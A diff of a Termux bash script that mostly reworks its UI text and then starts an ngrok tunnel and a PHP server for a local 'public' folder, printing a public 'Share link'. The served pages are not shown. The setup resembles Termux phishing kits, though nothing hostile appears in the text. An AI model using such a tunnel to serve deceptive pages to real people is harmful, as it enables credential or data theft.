@@ -1,5 +1,8 @@
 #!/data/data/com.termux/files/usr/bin/bash
 
+HIDE(){ echo -en "\033[?25l";}
+NORM(){ echo -en "\033[?12l\033[?25h";}
+
 clear
 echo""
 echo""
@@ -70,25 +73,28 @@ BL='\033[1;100m'
 
 command -v tput > /dev/null 2>&1 || apt install ncurses-utils &> /dev/null
 printf "$NC"
-trap '' 2
-tput civis
 clear ; echo ; echo;
-echo -ne "$BL[!] Please Turn On Your Mobile Hotspot $NC\r"
-sleep 1
-echo -ne "$BL[3] Please Turn On Your Mobile Hotspot $NC\r"
-sleep 1
-echo -ne "$BL[2] Please Turn On Your Mobile Hotspot $NC.\r"
-sleep 1
-echo -ne "$BL[1] Please Turn On Your Mobile Hotspot $NC..\r"
-sleep 1
-echo -ne "$BL[0] Please Turn On Your Mobile Hotspot $NC...\r"
-sleep 1
-echo -ne "$BL[√] Please Turn On Your Mobile Hotspot $NC...\r"
-sleep 5
-echo -ne '\n'
-tput cnorm
-trap 5
+HIDE
+echo -e "${BL}[!] Note : If you're turned on Hotspot then Share link will be visible.$NC"
 echo""
+sleep 2
+echo -ne "[5] Turn on Your Hotspot within 5 sec\r"
+sleep 0.5
+echo -ne "[5] Turn on Your Hotspot within 5 sec.\r"
+sleep 0.5
+echo -ne "[4] Turn on Your Hotspot within 5 sec..\r"
+sleep 0.5
+echo -ne "[4] Turn on Your Hotspot within 5 sec...\r"
+sleep 0.5
+echo -ne "[3] Turn on Your Hotspot within 5 sec\r"
+sleep 1
+echo -ne "[2] Turn on Your Hotspot within 5 sec.\r"
+sleep 1
+echo -ne "[1] Turn on Your Hotspot within 5 sec.\r"
+sleep 1
+echo -ne "[0] Turn on Your Hotspot within 5 sec...\r"
+sleep 1
+NORM
 
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
@@ -97,7 +103,6 @@ fi
 
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server \e[0m\e[1;97;101m(http 8080)\e[0m\e[1m...\n"
 ./ngrok http 8080 > /dev/null 2>&1 &
-sleep 5
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
@@ -107,6 +112,6 @@ exit 1
 fi
 printf "\e[1;92m[\e[0m\e[1m+\e[1;92m] Share \e[0m\e[1;97;101mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
 echo
-printf "\e[1;92m[\e[0m!\e[1;92m] \e[1;90;102mCTRL+C\e[0m\e[1;92m TO EXIT\e[0m"
+printf $"\e[1;92m[\e[0m!\e[1;92m] \e[1;90;102mCTRL+C\e[0m\e[1;92m TO EXIT\e[0m"
 cd public
 php -S localhost:8080 > /dev/null 2>&1
